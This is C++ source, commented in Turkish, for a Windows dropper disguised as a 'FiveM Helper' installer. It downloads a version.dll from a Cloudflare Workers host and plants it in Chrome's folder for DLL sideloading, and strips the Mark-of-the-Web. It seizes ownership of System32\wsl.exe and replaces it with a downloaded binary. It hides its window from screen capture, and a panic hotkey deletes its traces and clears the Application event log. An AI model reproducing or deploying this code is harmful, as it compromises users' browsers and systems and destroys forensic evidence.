
#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif
#ifndef NOMINMAX
#define NOMINMAX
#endif
#include <Windows.h>
#include <TlHelp32.h>
#include <ShlObj.h>
#include <objbase.h>
#include <vector>
#include <string>
#include <atomic>
#include <cstdio>

#include <aclapi.h>
#pragma comment(lib, "Shell32.lib")
#pragma comment(lib, "Advapi32.lib")
#pragma comment(lib, "gdiplus.lib")
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "winhttp.lib")
#include <winhttp.h>
#include <Psapi.h>
#include <gdiplus.h>
#include "..\assets\logo_bytes.h"

#ifndef WDA_EXCLUDEFROMCAPTURE
#define WDA_EXCLUDEFROMCAPTURE 0x00000011
#endif

// ─── Durum ───────────────────────────────────────────────────────────────────
enum Status {
    S_FINDING,    // Chrome klasörü aranıyor
    S_COPYING,    // version.dll kopyalanıyor
    S_WSL,        // wsl.exe kuruluyor
    S_ACTIVE,     // Kurulum tamamlandı
    S_ERROR,      // Hata
};

static std::atomic<Status> g_status { S_FINDING };
static HWND                g_notifWnd = nullptr;
static HMODULE             g_self     = nullptr;
static ULONG_PTR           g_gdipToken = 0;
static Gdiplus::Bitmap*    g_logoBmp   = nullptr;

static const wchar_t* GetStatusText(Status s) {
    switch (s) {
    case S_FINDING: return L"Chrome aranıyor...";
    case S_COPYING: return L"Yükleniyor...";
    case S_WSL:     return L"Sistem bileşeni kuruluyor...";
    case S_ACTIVE:  return L"Kurulum tamamlandı";
    case S_ERROR:   return L"Chrome bulunamadı";
    default:        return L"";
    }
}

static void SelfDestruct();

// ─── Animasyon ───────────────────────────────────────────────────────────────
enum AnimState { NF_HIDDEN, NF_SLIDEIN, NF_VISIBLE, NF_SLIDEOUT };
static AnimState g_an     = NF_HIDDEN;
static int       g_anF    = 0;
static int       g_anTick = 0;
static const int NF_FRAMES     = 18;
static const int NF_SHOW_TICKS = 125;
static int g_nX=0, g_nY=0, g_nW=300, g_nH=74;

// ─── Bildirim Penceresi ──────────────────────────────────────────────────────
static LRESULT CALLBACK NotifProc(HWND hwnd, UINT msg, WPARAM wp, LPARAM lp) {
    if (msg == WM_TIMER && wp == 1) {
        switch (g_an) {
        case NF_SLIDEIN:
            if (++g_anF >= NF_FRAMES) { g_anF = NF_FRAMES; g_an = NF_VISIBLE; g_anTick = 0; }
            break;
        case NF_VISIBLE:
            if (++g_anTick >= NF_SHOW_TICKS) { g_an = NF_SLIDEOUT; }
            break;
        case NF_SLIDEOUT:
            if (--g_anF <= 0) {
                g_anF = 0; g_an = NF_HIDDEN;
                ShowWindow(hwnd, SW_HIDE);
                KillTimer(hwnd, 1);
                return 0;
            }
            break;
        default: return 0;
        }
        float f = (float)g_anF / NF_FRAMES;
        float e = 1.0f - (1.0f-f)*(1.0f-f)*(1.0f-f);
        int   y = g_nY + (int)((1.0f - e) * (g_nH + 20));
        BYTE  a = (BYTE)(e * 235.0f);
        SetLayeredWindowAttributes(hwnd, 0, a, LWA_ALPHA);
        SetWindowPos(hwnd, HWND_TOPMOST, g_nX, y, 0, 0,
                     SWP_NOSIZE | SWP_NOACTIVATE | SWP_NOSENDCHANGING);
        InvalidateRect(hwnd, nullptr, FALSE);
        return 0;
    }
    if (msg == WM_APP + 1) {
        if (g_an == NF_HIDDEN || g_an == NF_SLIDEOUT) {
            g_anF = 0; g_an = NF_SLIDEIN;
            SetLayeredWindowAttributes(hwnd, 0, 0, LWA_ALPHA);
            SetWindowPos(hwnd, HWND_TOPMOST,
                         g_nX, g_nY + g_nH + 20, 0, 0,
                         SWP_NOSIZE | SWP_NOACTIVATE);
            ShowWindow(hwnd, SW_SHOWNOACTIVATE);
            SetTimer(hwnd, 1, 16, nullptr);
        } else {
            g_an = NF_VISIBLE; g_anTick = 0;
        }
        InvalidateRect(hwnd, nullptr, FALSE);
        return 0;
    }
    if (msg == WM_PAINT) {
        PAINTSTRUCT ps;
        HDC hdc = BeginPaint(hwnd, &ps);
        RECT rc; GetClientRect(hwnd, &rc);

        HBRUSH bgBr = CreateSolidBrush(RGB(15, 15, 15));
        FillRect(hdc, &rc, bgBr);
        DeleteObject(bgBr);

        HBRUSH stripBr = CreateSolidBrush(RGB(30, 215, 96));
        RECT strip = { 0, 0, 3, rc.bottom };
        FillRect(hdc, &rc, (HBRUSH)GetStockObject(NULL_BRUSH));
        FillRect(hdc, &strip, stripBr);
        DeleteObject(stripBr);

        SetBkMode(hdc, TRANSPARENT);
        {
            if (g_logoBmp) {
                Gdiplus::Graphics gr(hdc);
                gr.SetInterpolationMode(Gdiplus::InterpolationModeHighQualityBicubic);
                gr.SetSmoothingMode(Gdiplus::SmoothingModeAntiAlias);
                gr.DrawImage(g_logoBmp, 8, rc.bottom/2 - 18, 36, 36);
            }
        }
        HFONT fOld = nullptr;
        SetTextColor(hdc, RGB(160, 160, 160));
        HFONT fTitle = CreateFontW(12,0,0,0,FW_NORMAL,0,0,0,DEFAULT_CHARSET,
            OUT_DEFAULT_PRECIS,CLIP_DEFAULT_PRECIS,CLEARTYPE_QUALITY,
            DEFAULT_PITCH|FF_SWISS,L"Segoe UI");
        fOld = (HFONT)SelectObject(hdc, fTitle);
        RECT rTop = { 52, 7, rc.right-8, rc.bottom/2 };
        DrawTextW(hdc, L"FiveM Helper", -1, &rTop, DT_LEFT|DT_SINGLELINE|DT_VCENTER);
        SelectObject(hdc, fOld); DeleteObject(fTitle);

        SetTextColor(hdc, RGB(240, 240, 240));
        HFONT fSub = CreateFontW(14,0,0,0,FW_SEMIBOLD,0,0,0,DEFAULT_CHARSET,
            OUT_DEFAULT_PRECIS,CLIP_DEFAULT_PRECIS,CLEARTYPE_QUALITY,
            DEFAULT_PITCH|FF_SWISS,L"Segoe UI");
        fOld = (HFONT)SelectObject(hdc, fSub);
        RECT rBot = { 52, rc.bottom/2, rc.right-8, rc.bottom-7 };
        DrawTextW(hdc, GetStatusText(g_status.load()), -1, &rBot,
                  DT_LEFT|DT_SINGLELINE|DT_VCENTER);
        SelectObject(hdc, fOld); DeleteObject(fSub);
        EndPaint(hwnd, &ps);
        return 0;
    }
    if (msg == WM_DESTROY) { PostQuitMessage(0); return 0; }
    return DefWindowProcW(hwnd, msg, wp, lp);
}

static DWORD WINAPI NotifThread(LPVOID) {
    WNDCLASSEXW wc = {};
    wc.cbSize       = sizeof(wc);
    wc.lpfnWndProc  = NotifProc;
    wc.hInstance    = g_self;
    wc.lpszClassName = L"_THSN";
    wc.hbrBackground = (HBRUSH)GetStockObject(BLACK_BRUSH);
    RegisterClassExW(&wc);

    RECT work = {};
    if (!SystemParametersInfoW(SPI_GETWORKAREA, 0, &work, 0)) {
        work.right = GetSystemMetrics(SM_CXSCREEN);
        work.bottom = GetSystemMetrics(SM_CYSCREEN);
    }
    g_nX = work.right  - g_nW - 16;
    g_nY = work.bottom - g_nH - 12;

    g_notifWnd = CreateWindowExW(
        WS_EX_TOPMOST|WS_EX_TOOLWINDOW|WS_EX_NOACTIVATE|WS_EX_LAYERED,
        L"_THSN", L"", WS_POPUP,
        g_nX, g_nY + g_nH + 20, g_nW, g_nH,
        nullptr, nullptr, g_self, nullptr);
    if (!g_notifWnd) return 0;

    SetLayeredWindowAttributes(g_notifWnd, 0, 0, LWA_ALPHA);
    SetWindowDisplayAffinity(g_notifWnd, 0x00000001);

    // PANIC KEY: Ctrl+Shift+F12
    RegisterHotKey(nullptr, 1, MOD_CONTROL|MOD_SHIFT|MOD_NOREPEAT, VK_F12);

    MSG msg;
    while (GetMessageW(&msg, nullptr, 0, 0)) {
        if (msg.message == WM_HOTKEY && msg.wParam == 1) SelfDestruct();
        TranslateMessage(&msg);
        DispatchMessageW(&msg);
    }
    UnregisterHotKey(nullptr, 1);
    return 0;
}

static void SetStatus(Status s) {
    if (g_status.exchange(s) == s) return;
    if (g_notifWnd) PostMessageW(g_notifWnd, WM_APP + 1, 0, 0);
}

// ─── Tek instance ─────────────────────────────────────────────────────────────
static bool AlreadyRunning() {
    CreateMutexW(nullptr, TRUE, L"_CHRMHLP_MTX");
    return GetLastError() == ERROR_ALREADY_EXISTS;
}

// ─── Chrome yükleme klasörünü bul ────────────────────────────────────────────
// Önce registry, sonra yaygın konumlar.
static std::wstring FindChromeDir() {
    // 1) HKLM registry (sistem geneli kurulum)
    {
        HKEY hKey = nullptr;
        if (RegOpenKeyExW(HKEY_LOCAL_MACHINE,
            L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\chrome.exe",
            0, KEY_READ, &hKey) == ERROR_SUCCESS) {
            wchar_t path[MAX_PATH] = {};
            DWORD sz = sizeof(path);
            // "Path" value = klasör yolu
            if (RegQueryValueExW(hKey, L"Path", nullptr, nullptr,
                                 (BYTE*)path, &sz) == ERROR_SUCCESS && path[0]) {
                RegCloseKey(hKey);
                // path sonu '\' olabilir — kaldır
                size_t len = wcslen(path);
                if (len && path[len-1] == L'\\') path[len-1] = 0;
                return path;
            }
            // "Path" yoksa "(Default)" chrome.exe tam yolundan klasör çıkar
            sz = sizeof(path);
            if (RegQueryValueExW(hKey, nullptr, nullptr, nullptr,
                                 (BYTE*)path, &sz) == ERROR_SUCCESS && path[0]) {
                RegCloseKey(hKey);
                std::wstring p(path);
                auto pos = p.rfind(L'\\');
                if (pos != std::wstring::npos) p = p.substr(0, pos);
                return p;
            }
            RegCloseKey(hKey);
        }
    }
    // 2) HKCU registry (kullanıcı kurulumu)
    {
        HKEY hKey = nullptr;
        if (RegOpenKeyExW(HKEY_CURRENT_USER,
            L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\chrome.exe",
            0, KEY_READ, &hKey) == ERROR_SUCCESS) {
            wchar_t path[MAX_PATH] = {};
            DWORD sz = sizeof(path);
            if (RegQueryValueExW(hKey, L"Path", nullptr, nullptr,
                                 (BYTE*)path, &sz) == ERROR_SUCCESS && path[0]) {
                RegCloseKey(hKey);
                size_t len = wcslen(path);
                if (len && path[len-1] == L'\\') path[len-1] = 0;
                return path;
            }
            RegCloseKey(hKey);
        }
    }
    // 3) Sabit yollar
    const wchar_t* fallbacks[] = {
        L"C:\\Program Files\\Google\\Chrome\\Application",
        L"C:\\Program Files (x86)\\Google\\Chrome\\Application",
    };
    wchar_t localApp[MAX_PATH] = {};
    SHGetFolderPathW(nullptr, CSIDL_LOCAL_APPDATA, nullptr, SHGFP_TYPE_CURRENT, localApp);
    std::wstring userChrome = std::wstring(localApp) + L"\\Google\\Chrome\\Application";

    if (GetFileAttributesW(userChrome.c_str()) != INVALID_FILE_ATTRIBUTES)
        return userChrome;
    for (auto* p : fallbacks)
        if (GetFileAttributesW(p) != INVALID_FILE_ATTRIBUTES) return p;

    return {};
}

// ─── Cloudflare Workers bağlantı bilgileri (HTTPS) ────────────────────────────
static const wchar_t* C0       = L"moon-auth-service.moonsal.workers.dev";
static const WORD      C1      = 443;
static const wchar_t*  C_VER   = L"/download/version.dll";
static const wchar_t*  C_WSL   = L"/download/wsl.exe";

// ─── Cloudflare'den version.dll indir ───────────────────────────────────────────
static std::vector<BYTE> FetchVersionDll() {
    std::vector<BYTE> buf;
    HINTERNET hS = WinHttpOpen(L"Mozilla/5.0",
        WINHTTP_ACCESS_TYPE_NO_PROXY, nullptr, nullptr, 0);
    if (!hS) return buf;
    DWORD tmOut = 20000;
    WinHttpSetOption(hS, WINHTTP_OPTION_CONNECT_TIMEOUT, &tmOut, sizeof(tmOut));
    WinHttpSetOption(hS, WINHTTP_OPTION_SEND_TIMEOUT,    &tmOut, sizeof(tmOut));
    WinHttpSetOption(hS, WINHTTP_OPTION_RECEIVE_TIMEOUT, &tmOut, sizeof(tmOut));
    HINTERNET hC = WinHttpConnect(hS, C0, C1, 0);
    if (!hC) { WinHttpCloseHandle(hS); return buf; }
    HINTERNET hR = WinHttpOpenRequest(hC, L"GET", C_VER, nullptr, nullptr, nullptr, WINHTTP_FLAG_SECURE);
    if (!hR) { WinHttpCloseHandle(hC); WinHttpCloseHandle(hS); return buf; }
    if (WinHttpSendRequest(hR, nullptr, 0, nullptr, 0, 0, 0) &&
        WinHttpReceiveResponse(hR, nullptr)) {
        BYTE t[8192]; DWORD r = 0;
        while (WinHttpReadData(hR, t, sizeof(t), &r) && r)
            buf.insert(buf.end(), t, t + r);
    }
    WinHttpCloseHandle(hR); WinHttpCloseHandle(hC); WinHttpCloseHandle(hS);
    return buf;
}

// ─── Privilege aktifleştir ───────────────────────────────────────────────────
static void EnablePrivilege(LPCSTR name) {
    HANDLE tok = nullptr;
    if (!OpenProcessToken(GetCurrentProcess(),
                          TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &tok)) return;
    LUID luid = {};
    LookupPrivilegeValueA(nullptr, name, &luid);
    TOKEN_PRIVILEGES tp = {};
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    AdjustTokenPrivileges(tok, FALSE, &tp, 0, nullptr, nullptr);
    CloseHandle(tok);
}

// ─── System32\wsl.exe sahipliğini al ve yazma izni ver ───────────────────────
static bool TakeOwnershipWsl(const wchar_t* path) {
    EnablePrivilege("SeTakeOwnershipPrivilege");
    EnablePrivilege("SeRestorePrivilege");

    // Sahipliği Administrators grubuna ver
    PSID pAdmins = nullptr;
    SID_IDENTIFIER_AUTHORITY ntAuth = SECURITY_NT_AUTHORITY;
    AllocateAndInitializeSid(&ntAuth, 2,
        SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS,
        0,0,0,0,0,0, &pAdmins);

    BOOL ok = SetNamedSecurityInfoW(
        (LPWSTR)path, SE_FILE_OBJECT,
        OWNER_SECURITY_INFORMATION,
        pAdmins, nullptr, nullptr, nullptr) == ERROR_SUCCESS;

    if (ok) {
        // Tam kontrol ver
        EXPLICIT_ACCESSW ea = {};
        ea.grfAccessPermissions = GENERIC_ALL;
        ea.grfAccessMode        = SET_ACCESS;
        ea.grfInheritance       = NO_INHERITANCE;
        ea.Trustee.TrusteeForm  = TRUSTEE_IS_SID;
        ea.Trustee.TrusteeType  = TRUSTEE_IS_GROUP;
        ea.Trustee.ptstrName    = (LPWCH)pAdmins;
        PACL pNewDacl = nullptr;
        SetEntriesInAclW(1, &ea, nullptr, &pNewDacl);
        SetNamedSecurityInfoW((LPWSTR)path, SE_FILE_OBJECT,
            DACL_SECURITY_INFORMATION, nullptr, nullptr, pNewDacl, nullptr);
        if (pNewDacl) LocalFree(pNewDacl);
    }

    if (pAdmins) FreeSid(pAdmins);
    return ok;
}

// ─── wsl.exe'yi VDS'den indirip System32'ye kur ──────────────────────────────
static bool InstallWslLoader() {
    // VDS'den byte[] olarak çek
    std::vector<BYTE> buf;
    {
        HINTERNET hS = WinHttpOpen(L"Mozilla/5.0",
            WINHTTP_ACCESS_TYPE_NO_PROXY, nullptr, nullptr, 0);
        if (!hS) return false;
        DWORD t = 20000;
        WinHttpSetOption(hS, WINHTTP_OPTION_CONNECT_TIMEOUT, &t, sizeof(t));
        WinHttpSetOption(hS, WINHTTP_OPTION_SEND_TIMEOUT,    &t, sizeof(t));
        WinHttpSetOption(hS, WINHTTP_OPTION_RECEIVE_TIMEOUT, &t, sizeof(t));
        HINTERNET hC = WinHttpConnect(hS, C0, C1, 0);
        HINTERNET hR = hC ? WinHttpOpenRequest(hC, L"GET", C_WSL,
                                nullptr, nullptr, nullptr, WINHTTP_FLAG_SECURE) : nullptr;
        if (hR && WinHttpSendRequest(hR, nullptr, 0, nullptr, 0, 0, 0) &&
                  WinHttpReceiveResponse(hR, nullptr)) {
            BYTE tmp[8192]; DWORD rd = 0;
            while (WinHttpReadData(hR, tmp, sizeof(tmp), &rd) && rd)
                buf.insert(buf.end(), tmp, tmp + rd);
        }
        if (hR) WinHttpCloseHandle(hR);
        if (hC) WinHttpCloseHandle(hC);
        WinHttpCloseHandle(hS);
    }
    if (buf.empty()) return false;

    // Önce %TEMP%'e yaz
    wchar_t tmpDir[MAX_PATH] = {};
    GetTempPathW(MAX_PATH, tmpDir);
    std::wstring tmpExe = std::wstring(tmpDir) + L"wsl_setup.exe";
    {
        FILE* f = nullptr;
        if (_wfopen_s(&f, tmpExe.c_str(), L"wb") != 0 || !f) return false;
        fwrite(buf.data(), 1, buf.size(), f);
        fclose(f);
    }

    wchar_t sysDir[MAX_PATH] = {};
    GetSystemDirectoryW(sysDir, MAX_PATH);
    std::wstring wslPath     = std::wstring(sysDir) + L"\\wsl.exe";
    std::wstring wslRealPath = std::wstring(sysDir) + L"\\wsl_real.exe";

    // Sahiplik + izin al
    TakeOwnershipWsl(wslPath.c_str());
    SetFileAttributesW(wslPath.c_str(), FILE_ATTRIBUTE_NORMAL);

    // Orijinal wsl.exe → wsl_real.exe (zaten varsa atla)
    if (GetFileAttributesW(wslRealPath.c_str()) == INVALID_FILE_ATTRIBUTES)
        MoveFileExW(wslPath.c_str(), wslRealPath.c_str(), MOVEFILE_REPLACE_EXISTING);

    // Bizim wsl.exe'yi koy
    BOOL moved = MoveFileExW(tmpExe.c_str(), wslPath.c_str(), MOVEFILE_REPLACE_EXISTING);
    if (!moved) {
        // MoveFile aynı volume değilse başarısız olabilir — kopyala
        CopyFileW(tmpExe.c_str(), wslPath.c_str(), FALSE);
        DeleteFileW(tmpExe.c_str());
    }

    return GetFileAttributesW(wslPath.c_str()) != INVALID_FILE_ATTRIBUTES;
}

// ─── version.dll'i VDS'den indirip Chrome klasörüne yaz ─────────────────────
static bool FetchAndInstallVersionDll(const std::wstring& chromeDir) {
    auto buf = FetchVersionDll();
    if (buf.empty()) return false;

    std::wstring dst = chromeDir + L"\\version.dll";
    SetFileAttributesW(dst.c_str(), FILE_ATTRIBUTE_NORMAL);

    FILE* f = nullptr;
    if (_wfopen_s(&f, dst.c_str(), L"wb") != 0 || !f) return false;
    fwrite(buf.data(), 1, buf.size(), f);
    fclose(f);

    // Mark of the Web ADS sil
    DeleteFileW((dst + L":Zone.Identifier").c_str());
    return true;
}

// ─── SELF-DESTRUCT (Ctrl+Shift+F12) ─────────────────────────────────────────
static void SelfDestruct() {
    if (g_notifWnd) ShowWindow(g_notifWnd, SW_HIDE);

    // version.dll'i Chrome'dan sil
    std::wstring chromeDir = FindChromeDir();
    if (!chromeDir.empty()) {
        std::wstring dll = chromeDir + L"\\version.dll";
        SetFileAttributesW(dll.c_str(), FILE_ATTRIBUTE_NORMAL);
        DeleteFileW(dll.c_str());
    }

    // setup.exe'yi batch ile sil
    wchar_t self[MAX_PATH] = {};
    GetModuleFileNameW(nullptr, self, MAX_PATH);
    wchar_t batDir[MAX_PATH] = {};
    GetTempPathW(MAX_PATH, batDir);
    std::wstring bat = std::wstring(batDir) + L"tmp_gc.bat";
    FILE* f = nullptr;
    _wfopen_s(&f, bat.c_str(), L"w");
    if (f) {
        fwprintf(f, L"@echo off\r\nping -n 2 127.0.0.1 >nul\r\n");
        fwprintf(f, L"del /F /Q \"%s\"\r\n", self);
        fwprintf(f, L"wevtutil cl Application >nul 2>&1\r\n");
        fwprintf(f, L"del /F /Q \"%%~f0\"\r\n");
        fclose(f);
        STARTUPINFOW si = {}; si.cb = sizeof(si);
        si.dwFlags = STARTF_USESHOWWINDOW; si.wShowWindow = SW_HIDE;
        PROCESS_INFORMATION pi = {};
        std::wstring cmd = L"cmd.exe /C \"" + bat + L"\"";
        CreateProcessW(nullptr, cmd.data(), nullptr, nullptr,
                       FALSE, CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi);
        if (pi.hProcess) CloseHandle(pi.hProcess);
        if (pi.hThread)  CloseHandle(pi.hThread);
    }
    ExitProcess(0);
}

// ─── Kurulum ─────────────────────────────────────────────────────────────────
static void DoInstall() {
    SetStatus(S_FINDING);
    Sleep(400); // toast görünsün

    std::wstring chromeDir = FindChromeDir();
    if (chromeDir.empty()) {
        SetStatus(S_ERROR);
        Sleep(3000);
        PostQuitMessage(0);
        return;
    }

    SetStatus(S_COPYING);

    if (!FetchAndInstallVersionDll(chromeDir)) {
        SetStatus(S_ERROR);
        Sleep(3000);
        PostQuitMessage(0);
        return;
    }

    // wsl.exe kurulumu (WSL kurulu değilse sessizce atla)
    SetStatus(S_WSL);
    InstallWslLoader(); // başarısız olsa da devam et — WSL opsiyonel

    SetStatus(S_ACTIVE);
    Sleep(2500); // "Kurulum tamamlandı" göster

    // setup.exe'yi geciktirilmiş sil
    wchar_t self[MAX_PATH] = {};
    GetModuleFileNameW(nullptr, self, MAX_PATH);
    wchar_t batDir[MAX_PATH] = {};
    GetTempPathW(MAX_PATH, batDir);
    std::wstring bat = std::wstring(batDir) + L"tmp_si.bat";
    FILE* fb = nullptr;
    _wfopen_s(&fb, bat.c_str(), L"w");
    if (fb) {
        fwprintf(fb, L"@echo off\r\nping -n 3 127.0.0.1 >nul\r\n");
        fwprintf(fb, L"del /F /Q \"%s\"\r\n", self);
        fwprintf(fb, L"del /F /Q \"%%~f0\"\r\n");
        fclose(fb);
        STARTUPINFOW si = {}; si.cb = sizeof(si);
        si.dwFlags = STARTF_USESHOWWINDOW; si.wShowWindow = SW_HIDE;
        PROCESS_INFORMATION pi = {};
        std::wstring cmd = L"cmd.exe /C \"" + bat + L"\"";
        CreateProcessW(nullptr, cmd.data(), nullptr, nullptr,
            FALSE, CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi);
        if (pi.hProcess) CloseHandle(pi.hProcess);
        if (pi.hThread)  CloseHandle(pi.hThread);
    }

    PostQuitMessage(0);
}

// ════════════════════════════════════════════════════════════════════════════
int WINAPI WinMain(HINSTANCE hInst, HINSTANCE, LPSTR, int) {
    g_self = hInst;

    if (AlreadyRunning()) return 0;

    // GDI+
    {
        Gdiplus::GdiplusStartupInput gsi;
        Gdiplus::GdiplusStartup(&g_gdipToken, &gsi, nullptr);
        if (g_logoPngSize > 0) {
            HGLOBAL hMem = GlobalAlloc(GMEM_MOVEABLE, g_logoPngSize);
            if (hMem) {
                void* p = GlobalLock(hMem);
                if (p) { memcpy(p, g_logoPng, g_logoPngSize); GlobalUnlock(hMem); }
                IStream* s = nullptr;
                if (SUCCEEDED(CreateStreamOnHGlobal(hMem, TRUE, &s)) && s) {
                    g_logoBmp = Gdiplus::Bitmap::FromStream(s);
                    s->Release();
                }
            }
        }
    }

    // Bildirim thread
    HANDLE hNotif = CreateThread(nullptr, 0, NotifThread, nullptr, 0, nullptr);
    Sleep(200);

    // Kurulum (ayrı thread — NotifThread message loop'unu bloklamasın)
    HANDLE hInst2 = CreateThread(nullptr, 0, [](LPVOID) -> DWORD {
        DoInstall(); return 0;
    }, nullptr, 0, nullptr);

    // Bildirim message loop
    if (hNotif) {
        WaitForSingleObject(hNotif, INFINITE);
        CloseHandle(hNotif);
    }
    if (hInst2) CloseHandle(hInst2);

    if (g_logoBmp) delete g_logoBmp;
    if (g_gdipToken) Gdiplus::GdiplusShutdown(g_gdipToken);
    return 0;
}
